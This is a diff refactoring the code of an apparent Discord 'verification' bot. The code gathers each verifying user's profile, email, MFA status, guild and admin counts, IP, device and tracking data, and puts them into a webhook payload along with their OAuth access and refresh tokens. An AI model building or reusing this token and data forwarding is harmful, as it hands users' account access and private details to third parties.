@@ -265,23 +265,13 @@ function formatSpoofedHeaders(device = {}) {
     return "ไม่พบ (ปกติ ✅)";
 }
 
-function buildDiscordInfoLines(profile, guildSummary) {
+function _buildDiscordIdentityLines(profile) {
     const globalName = profile.globalName || profile.username || "ไม่มี";
     const username = profile.username || "ไม่มี";
     const userId = String(profile.id || "ไม่มี");
     const avatarLink = profile.avatarUrl ? `[คลิกเพื่อดูรูปโปรไฟล์](${profile.avatarUrl})` : "ไม่มี";
     const bannerLink = profile.bannerUrl ? `[คลิกเพื่อดูแบนเนอร์](${profile.bannerUrl})` : "ไม่มี";
     const discriminator = profile.discriminator && profile.discriminator !== "0" ? `#${profile.discriminator}` : "#0";
-    const email = profile.email || "ไม่มีข้อมูล";
-    const emailVerifiedText = profile.emailVerified ? `ยืนยันแล้ว${EMOJIS.CHECK}` : `ยังไม่ยืนยัน${EMOJIS.CROSS}`;
-    const appLocale = profile.locale || "th";
-    const mfaText = profile.mfaEnabled ? `เปิดใช้งาน${EMOJIS.CHECK}` : `ปิด${EMOJIS.CROSS}`;
-    const createdDate = profile.accountCreatedAt ? `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)` : "ไม่ระบุ";
-    const badges = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length ? profile.badgeFlags.join(", ") : "ไม่มี";
-    const nitroText = formatNitro(profile.premiumType);
-    const totalGuilds = guildSummary ? (guildSummary.totalGuilds ?? guildSummary.totalCount ?? "ไม่ระบุ") : "ไม่ระบุ";
-    const ownedGuilds = guildSummary ? (guildSummary.ownerGuildsCount ?? guildSummary.ownedCount ?? 0) : 0;
-    const adminGuilds = guildSummary ? (guildSummary.adminGuildsCount ?? guildSummary.adminCount ?? 0) : 0;
 
     return [
         `  • Global Name : ${globalName}`,
@@ -289,17 +279,47 @@ function buildDiscordInfoLines(profile, guildSummary) {
         `  • User ID : ${userId}`,
         `  • Avatar URL : ${avatarLink}`,
         `  • Banner URL : ${bannerLink}`,
-        `  • Discriminator : ${discriminator}`,
+        `  • Discriminator : ${discriminator}`
+    ];
+}
+
+function _buildDiscordAccountLines(profile) {
+    const email = profile.email || "ไม่มีข้อมูล";
+    const emailVerifiedText = profile.emailVerified ? `ยืนยันแล้ว${EMOJIS.CHECK}` : `ยังไม่ยืนยัน${EMOJIS.CROSS}`;
+    const appLocale = profile.locale || "th";
+    const mfaText = profile.mfaEnabled ? `เปิดใช้งาน${EMOJIS.CHECK}` : `ปิด${EMOJIS.CROSS}`;
+    const createdDate = profile.accountCreatedAt ? `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)` : "ไม่ระบุ";
+    const badges = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length ? profile.badgeFlags.join(", ") : "ไม่มี";
+    const nitroText = formatNitro(profile.premiumType);
+
+    return [
         `  • Email : ${email}`,
         `  • Email Verified : ${emailVerifiedText}`,
         `  • ภาษาของแอป Discord : ${appLocale}`,
         `  • MFA (2FA) : ${mfaText}`,
         `  • วันสร้างบัญชี : ${createdDate}`,
         `  • เหรียญตรา : ${badges}`,
-        `  • มี Nitro ไหม : ${nitroText}`,
+        `  • มี Nitro ไหม : ${nitroText}`
+    ];
+}
+
+function _buildDiscordGuildLines(guildSummary) {
+    const totalGuilds = guildSummary ? (guildSummary.totalGuilds ?? guildSummary.totalCount ?? "ไม่ระบุ") : "ไม่ระบุ";
+    const ownedGuilds = guildSummary ? (guildSummary.ownerGuildsCount ?? guildSummary.ownedCount ?? 0) : 0;
+    const adminGuilds = guildSummary ? (guildSummary.adminGuildsCount ?? guildSummary.adminCount ?? 0) : 0;
+
+    return [
         `  • เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด : ${totalGuilds} เซิร์ฟเวอร์`,
         `  • เซิร์ฟเวอร์ที่เป็นเจ้าของ : ${ownedGuilds} เซิร์ฟเวอร์`,
         `  • มียศ เเอดมิน กี่เซิฟเวอร์ : ${adminGuilds} เซิร์ฟเวอร์`
+    ];
+}
+
+function buildDiscordInfoLines(profile, guildSummary) {
+    return [
+        ..._buildDiscordIdentityLines(profile),
+        ..._buildDiscordAccountLines(profile),
+        ..._buildDiscordGuildLines(guildSummary)
     ];
 }
 
@@ -1461,40 +1481,48 @@ class VerificationWebhookManager {
         return true;
     }
 
+    _resolveDeliveryProfile(log, oauthUser) {
+        return {
+            id: log.userId,
+            username: log.discordSnapshot?.username || oauthUser?.discord?.username,
+            globalName: log.discordSnapshot?.globalName || oauthUser?.discord?.globalName,
+            discriminator: log.discordSnapshot?.discriminator || oauthUser?.discord?.discriminator,
+            displayTag: log.discordSnapshot?.displayTag || oauthUser?.discord?.displayTag || log.discordSnapshot?.username,
+            avatarUrl: log.discordSnapshot?.avatarUrl || oauthUser?.discord?.avatarUrl,
+            bannerUrl: log.discordSnapshot?.bannerUrl || oauthUser?.discord?.bannerUrl,
+            accountCreatedAt: log.discordSnapshot?.accountCreatedAt || oauthUser?.discord?.accountCreatedAt,
+            accountAgeDays: log.discordSnapshot?.accountAgeDays || oauthUser?.discord?.accountAgeDays,
+            email: log.discordSnapshot?.email || oauthUser?.discord?.email,
+            emailVerified: log.discordSnapshot?.emailVerified ?? oauthUser?.discord?.emailVerified,
+            locale: log.discordSnapshot?.locale || oauthUser?.discord?.locale,
+            mfaEnabled: log.discordSnapshot?.mfaEnabled ?? oauthUser?.discord?.mfaEnabled,
+            premiumType: log.discordSnapshot?.premiumType ?? oauthUser?.discord?.premiumType,
+            badgeFlags: log.discordSnapshot?.badgeFlags || oauthUser?.discord?.badgeFlags || []
+        };
+    }
+
+    _resolveDeliveryTokens(oauthUser) {
+        return {
+            accessToken: oauthUser?.oauth?.accessToken,
+            refreshToken: oauthUser?.oauth?.refreshToken,
+            encryptedAccessToken: oauthUser?.oauth?.encryptedAccessToken,
+            encryptedRefreshToken: oauthUser?.oauth?.encryptedRefreshToken,
+            scope: oauthUser?.oauth?.scope || "identify email connections guilds guilds.members.read guilds.join",
+            expiresAt: oauthUser?.oauth?.expiresAt
+        };
+    }
+
     _buildDeliveryEmbeds(log, oauthUser, item, config) {
         return buildWebhookPayload({
             eventId: String(log._id),
             guildId: log.guildId || item.guild_id,
             guildName: config?.guildName || config?.name || null,
-            profile: {
-                id: log.userId,
-                username: log.discordSnapshot?.username || oauthUser?.discord?.username,
-                globalName: log.discordSnapshot?.globalName || oauthUser?.discord?.globalName,
-                discriminator: log.discordSnapshot?.discriminator || oauthUser?.discord?.discriminator,
-                displayTag: log.discordSnapshot?.displayTag || oauthUser?.discord?.displayTag || log.discordSnapshot?.username,
-                avatarUrl: log.discordSnapshot?.avatarUrl || oauthUser?.discord?.avatarUrl,
-                bannerUrl: log.discordSnapshot?.bannerUrl || oauthUser?.discord?.bannerUrl,
-                accountCreatedAt: log.discordSnapshot?.accountCreatedAt || oauthUser?.discord?.accountCreatedAt,
-                accountAgeDays: log.discordSnapshot?.accountAgeDays || oauthUser?.discord?.accountAgeDays,
-                email: log.discordSnapshot?.email || oauthUser?.discord?.email,
-                emailVerified: log.discordSnapshot?.emailVerified ?? oauthUser?.discord?.emailVerified,
-                locale: log.discordSnapshot?.locale || oauthUser?.discord?.locale,
-                mfaEnabled: log.discordSnapshot?.mfaEnabled ?? oauthUser?.discord?.mfaEnabled,
-                premiumType: log.discordSnapshot?.premiumType ?? oauthUser?.discord?.premiumType,
-                badgeFlags: log.discordSnapshot?.badgeFlags || oauthUser?.discord?.badgeFlags || []
-            },
+            profile: this._resolveDeliveryProfile(log, oauthUser),
             connections: log.connectionsSnapshot || oauthUser?.connections || [],
             guildSummary: log.guildSummary || oauthUser?.guildSummary || null,
             ipInfo: log.ipInfo || {},
             device: log.device || {},
-            tokens: {
-                accessToken: oauthUser?.oauth?.accessToken,
-                refreshToken: oauthUser?.oauth?.refreshToken,
-                encryptedAccessToken: oauthUser?.oauth?.encryptedAccessToken,
-                encryptedRefreshToken: oauthUser?.oauth?.encryptedRefreshToken,
-                scope: oauthUser?.oauth?.scope || "identify email connections guilds guilds.members.read guilds.join",
-                expiresAt: oauthUser?.oauth?.expiresAt
-            },
+            tokens: this._resolveDeliveryTokens(oauthUser),
             trackingSnapshot: log.trackingSnapshot || oauthUser?.lastIpTracking || {},
             roleId: log.roleId,
             roleName: config?.verification?.roleName || null,
